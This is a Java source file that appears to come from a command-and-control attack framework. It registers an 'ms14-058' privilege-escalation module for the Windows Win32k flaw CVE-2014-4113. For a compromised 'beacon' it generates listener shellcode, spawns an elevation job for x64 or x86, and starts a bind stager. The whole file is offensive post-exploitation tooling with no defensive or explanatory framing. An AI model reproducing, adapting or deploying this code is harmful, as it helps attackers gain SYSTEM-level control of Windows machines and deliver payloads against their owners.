package beacon.exploits;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import beacon.BeaconExploits;
import beacon.TaskBeacon;
import beacon.jobs.ElevateJob;
import common.BeaconEntry;
import common.CommonUtils;

public class cve_2014_4113 implements BeaconExploits.Exploit {
    protected AggressorClient client;

    public cve_2014_4113(AggressorClient client) {
        this.client = client;
        DataUtils.getBeaconExploits(client.getData()).register("ms14-058", "TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)", this);
    }

    @Override
    public void elevate(String bid, String listener) {
        TaskBeacon tasker = new TaskBeacon(this.client, new String[]{bid});
        byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), listener);
        BeaconEntry entry = DataUtils.getBeacon(this.client.getData(), bid);
        if (entry != null && entry.is64()) {
            new ElevateJob(tasker, listener, stager).spawn(bid, "x64");
        } else if (entry != null) {
            new ElevateJob(tasker, listener, stager).spawn(bid, "x86");
        } else {
            CommonUtils.print_error("Beacon " + bid + " has no entry. Not issuing elevate task");
        }
        tasker.handleBindStager(listener);
    }
}

